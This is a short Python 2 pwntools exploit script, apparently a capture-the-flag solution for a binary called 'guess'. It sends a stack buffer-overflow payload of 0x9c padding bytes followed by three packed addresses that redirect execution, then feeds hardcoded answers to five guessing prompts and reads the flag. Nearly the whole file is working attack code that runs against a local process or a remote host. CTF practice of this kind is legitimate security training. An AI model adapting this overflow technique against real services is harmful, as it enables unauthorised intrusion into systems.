#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

context.log_level = 'debug'

binary = './guess'
e = ELF(binary)
e.checksec()

if 'HOST' in args:
  io = remote(args['HOST'], int(args['PORT']))
else:
  io = process(binary)
  #gdb.attach(io, '''
  #  continue
  #''')

def guess(s):
    if 'tbap' in s:
        return 'pikachu'
    if 'JOE' in s:
        return 'peanuts'
    if 'c =' in s:
        return 'superman'
    if '888888' in s:
        return 'linux'
    if 'T$$$P' in s:
        return 'batman'

pause()

io.recvuntil('guess: ')
payload = 'A' * 0x9c + pack(0x8048830) + pack(0x080485E0) + pack(0x804a100) 
io.sendline(payload)

for i in xrange(5):
    answer = guess(io.recvuntil('guess: '))
    io.sendline(answer)

io.recvuntil('Input your email: ')
io.sendline('flag')
print io.recv()

